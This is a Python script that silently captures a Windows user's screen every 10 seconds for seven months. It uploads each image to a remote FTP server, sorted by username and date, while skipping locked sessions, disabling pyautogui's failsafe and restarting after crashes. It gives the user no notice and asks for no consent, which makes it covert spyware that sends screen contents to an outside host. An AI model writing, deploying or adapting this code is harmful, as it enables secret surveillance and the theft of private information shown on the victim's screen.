import pyautogui
import time
import os
from datetime import datetime
import logging
from ftplib import FTP
from io import BytesIO
import sys
import ctypes
import psutil

try:
    import win32gui
    import win32api
    import win32ts
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False
    logging.warning("win32 modules not available. System lock/sleep detection will partially rely on alternative methods.")

log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "screenshot_log.txt")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s: %(levelname)s: %(message)s",
    handlers=[
        logging.FileHandler(log_file_path),
    ]
)

SEVEN_MONTHS_SECONDS = 7 * 30 * 24 * 60 * 60  

def is_system_locked():
    """Check if the system is locked using multiple methods."""
    user32 = ctypes.windll.User32

    foreground_handle = user32.GetForegroundWindow()
    logging.debug(f"Foreground window handle: {foreground_handle}")
    locked_handles = [0, 67370, 1901390] 
    if foreground_handle in locked_handles:
        logging.warning(f"Locked detected via window handle: {foreground_handle}")
        return True

    # Check for LogonUI.exe process using psutil
    try:
        for proc in psutil.process_iter(['name']):
            if 'logonui.exe' in proc.info['name'].lower():
                logging.warning(f"Locked detected via LogonUI.exe process.")
                return True
    except Exception as e:
        logging.error(f"Failed to check process list with psutil: {e}")

    logging.info("System is active and unlocked.")
    return False

def take_and_upload_screenshots():
    ftp_host = "ip"
    ftp_user = ""
    ftp_password = ""
    ftp_base_directory = "/"

    # Get username and start time
    try:
        username = os.getlogin()
    except Exception as e:
        username = "UnknownUser"
        logging.error(f"Failed to get username: {e}")
    start_time = time.time()
    logging.info(f"Starting screenshot upload for user: {username}")

    while (time.time() - start_time) < SEVEN_MONTHS_SECONDS:  # Run for 7 months
        try:
            # Check if system is locked
            if is_system_locked():
                logging.warning("System is locked. Pausing screenshot capture...")
                while is_system_locked():
                    time.sleep(10)  # Keep checking every 10 seconds
                logging.info("System unlocked. Resuming screenshot capture...")
                continue

            # Take screenshot
            logging.info("Attempting to capture screenshot...")
            screenshot = pyautogui.screenshot()
            logging.info("Screenshot captured successfully")

            # Convert to bytes
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format="JPEG", quality=50)
            img_byte_arr.seek(0)

            # Generate filename with timestamp
            timestamp = datetime.now().strftime("%H-%M-%S")
            date_folder = datetime.now().strftime("%Y-%m-%d")
            file_name = f"{date_folder}-({timestamp}).jpg"

            # Define FTP paths
            user_folder = f"{ftp_base_directory}/{username}"
            date_path = f"{user_folder}/{date_folder}"

            # Connect to FTP and upload
            logging.info("Connecting to FTP server...")
            with FTP(ftp_host) as ftp:
                ftp.login(user=ftp_user, passwd=ftp_password)
                logging.info(f"Connected to FTP server: {ftp_host}")

                # Navigate or create base directory
                try:
                    ftp.cwd(ftp_base_directory)
                except:
                    ftp.mkd(ftp_base_directory)
                    ftp.cwd(ftp_base_directory)

                # Navigate or create user folder
                try:
                    ftp.cwd(user_folder)
                except:
                    ftp.mkd(user_folder)
                    ftp.cwd(user_folder)

                # Navigate or create date folder
                try:
                    ftp.cwd(date_path)
                except:
                    ftp.mkd(date_path)
                    ftp.cwd(date_path)

                # Upload the screenshot
                ftp.storbinary(f"STOR {file_name}", img_byte_arr)
                logging.info(f"Uploaded screenshot: {date_path}/{file_name}")

            # Wait before the next screenshot
            time.sleep(10)

        except pyautogui.PyAutoGUIException as e:
            logging.error(f"Screenshot failed: {e}. Retrying in 30 seconds...")
            time.sleep(30)
        except Exception as e:
            logging.error(f"An error occurred: {e}. Retrying in 30 seconds...")
            time.sleep(30)

    logging.info("7-month duration completed. Stopping script.")

def run_forever():
    """Run the script and restart on crashes."""
    while True:
        try:
            take_and_upload_screenshots()
            break  # Exit after 7 months
        except Exception as e:
            logging.critical(f"Script crashed: {e}. Restarting in 60 seconds...")
            time.sleep(60)

if __name__ == "__main__":
    # Disable PyAutoGUI failsafe for unattended operation
    pyautogui.FAILSAFE = False
    try:
        logging.info("Script started in background")
        run_forever()
    except KeyboardInterrupt:
        logging.info("Script terminated by user")
        sys.exit(0)
    except Exception as e:
        logging.critical(f"Fatal error in main: {e}")
        sys.exit(1)